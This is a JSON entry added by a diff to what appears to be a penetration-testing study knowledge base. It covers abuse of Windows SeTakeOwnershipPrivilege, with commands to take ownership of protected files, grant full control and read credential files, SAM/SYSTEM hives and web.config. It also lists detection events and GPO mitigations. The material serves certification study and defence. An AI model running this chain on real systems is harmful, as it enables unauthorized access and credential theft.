@@ -1,0 +1,95 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "takeown",
+    "icacls"
+  ],
+  "tags": [
+    "setakeownership",
+    "acl",
+    "file-read"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - Token Privileges",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "Enable all token privileges first",
+      "command": ".\\EnableAllTokenPrivs.ps1"
+    },
+    {
+      "label": "takeown to seize the target file",
+      "command": "takeown /f 'C:\\Department Shares\\Private\\IT\\cred.txt'"
+    },
+    {
+      "label": "icacls to grant yourself full control",
+      "command": "icacls 'C:\\Department Shares\\Private\\IT\\cred.txt' /grant htb-student:F"
+    },
+    {
+      "label": "Read the file",
+      "command": "cat 'C:\\Department Shares\\Private\\IT\\cred.txt'"
+    }
+  ],
+  "notes": "=== SeTakeOwnershipPrivilege — Object Ownership Takeover ===\nTake ownership of any Windows object (file, registry key, service) regardless of existing ACL.\n\n=== 4-STEP EXPLOITATION CHAIN ===\nStep 1: Enable the privilege (Disabled by default even when assigned)\n  Import-Module .\\EnableAllTokenPrivs.ps1\n  EnableAllTokenPrivs\n  whoami /priv | findstr TakeOwnership   → must show Enabled\n\nStep 2: Inspect target\n  Get-ChildItem -Path 'C:\\path' | Select Name,@{Name='Owner';Expression={(Get-Acl $_.FullName).Owner}}\n  cmd /c dir /q C:\\target   (alternative — shows owner column)\n\nStep 3: Take ownership\n  takeown /f 'C:\\target\\file.txt'\n  takeown /f 'C:\\target\\' /r /d y   (recursive directory)\n\nStep 4: Grant read/write via icacls\n  icacls 'C:\\target\\file.txt' /grant 'DOMAIN\\user:F'\n  Get-Content 'C:\\target\\file.txt'\n\n=== HIGH-VALUE TARGET FILES ===\nC:\\Windows\\System32\\config\\SAM       → local account hashes\nC:\\Windows\\System32\\config\\SYSTEM    → Boot Key (needed to decrypt SAM)\nC:\\Windows\\repair\\SAM                 → backup SAM hive\nweb.config in IIS directories            → database connection strings with credentials\n*.kdbx (KeePass databases)              → all org credentials if master password cracked\nC:\\Windows\\System32\\winevt\\Logs\\Security.evtx → Security event log with credentials in 4688\n\n=== PRIVILEGE ASSIGNMENT ===\nDefault holders: Administrators only\nGPO path: Computer Configuration > Windows Settings > Security Settings > Local Policies > User Rights Assignment\nAlso assigned via: AD attack chains (SharpGPOAbuse), backup/VSS service accounts\n\n=== CHAINING CONTEXT ===\nSeTakeOwnership → takeown SAM + SYSTEM hives → secretsdump offline → local hash crack\nSeTakeOwnership → takeown web.config → extract DB credentials → lateral movement\nSeTakeOwnership → takeown service binary → replace with malicious binary → SYSTEM on service restart\nGPO abuse (SharpGPOAbuse grants privilege) → chains into file takeover\n\n=== FORENSIC NOTES ===\nTwo forensic artifacts: ownership change + ACL modification (both logged).\nTaking ownership of active files (live web.config, running service binary) can break applications.\nAlways document and attempt to revert after reading target in authorized engagements.",
+  "references": [
+    {
+      "title": "Microsoft - takeown",
+      "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/takeown"
+    },
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ref-files-of-interest",
+      "note": "High-value files worth seizing.",
+      "rel": "next"
+    },
+    {
+      "id": "winpe-user-group-enum",
+      "note": "Confirms SeTakeOwnershipPrivilege is held.",
+      "rel": "prereq"
+    }
+  ],
+  "id": "setakeownership",
+  "name": "SeTakeOwnershipPrivilege - Own and Read a File",
+  "command": "takeown /f '<target_file>'",
+  "description": "SeTakeOwnershipPrivilege lets you become owner of any file, then grant yourself full control via icacls and read protected content (e.g. cred files, SAM/SYSTEM backups, web.config). Enable the privilege first with EnableAllTokenPrivs.ps1.",
+  "opsec": "loud",
+  "mitre": [
+    "T1222.001"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "SeTakeOwnershipPrivilege allows a user to become the owner of any securable object (file, registry key) regardless of the existing DACL. As owner, the user can then modify the DACL to grant themselves full access. EnableAllTokenPrivs.ps1 enables all available privileges in the token. The 4-step chain: enable privilege → take ownership → grant access → read/modify the protected object.",
+    "prerequisites": "SeTakeOwnershipPrivilege available in token (assigned to specific groups like Print Operators or explicitly granted). EnableAllTokenPrivs.ps1 available. Target protected file or registry key.",
+    "impact": "Read or modify any protected file or registry key on the system, bypassing ACL protections. Can be used to read confidential data, replace binaries, or modify system configuration.",
+    "detection": "EnableAllTokenPrivs.ps1 execution. takeown.exe on SYSTEM-owned files by non-admin. icacls grant by non-owner on protected files. Event 4670: object permissions changed. Event 4656: handle requested with WRITE_DAC on protected file.",
+    "artifacts": "Process: takeown.exe on protected file by non-admin | Event 4670: DACL changed on sensitive file | Process: icacls.exe granting access | File: sensitive file read by non-admin",
+    "prevention": "Restrict SeTakeOwnershipPrivilege via GPO — remove from all groups/accounts that don't operationally need it. Monitor takeown.exe execution on system files. Enable Object Access auditing on sensitive files and registry keys.",
+    "misconfiguration": "SeTakeOwnershipPrivilege granted to non-admin groups (e.g., Print Operators) with excessive scope. No monitoring on takeown.exe usage. No Object Access auditing on sensitive files.",
+    "vulnerable_config": "# 4-step SeTakeOwnership chain:\n# 1. Enable privileges:\nImport-Module .\\Enable-Privilege.ps1\nEnableAllTokenPrivs\n\n# 2. Take ownership:\ntakeown /F 'C:\\Department Shares\\Private\\IT\\cred.txt'\n\n# 3. Grant access:\nicacls 'C:\\Department Shares\\Private\\IT\\cred.txt' /grant htb-student:F\n\n# 4. Read file:\ncat 'C:\\Department Shares\\Private\\IT\\cred.txt'",
+    "secure_config": "# Restrict SeTakeOwnershipPrivilege:\n# GPO: Computer Configuration > Windows Settings > Security Settings\n# > Local Policies > User Rights Assignment\n# > Take ownership of files or other objects: Administrators only\n\n# Enable Object Access auditing:\nauditpol /set /subcategory:'File System' /success:enable /failure:enable\n\n# Alert: takeown.exe execution on sensitive directories",
+    "sources": [
+      "HTB M26",
+      "MITRE T1222.001",
+      "MITRE T1078"
+    ]
+  }
+}
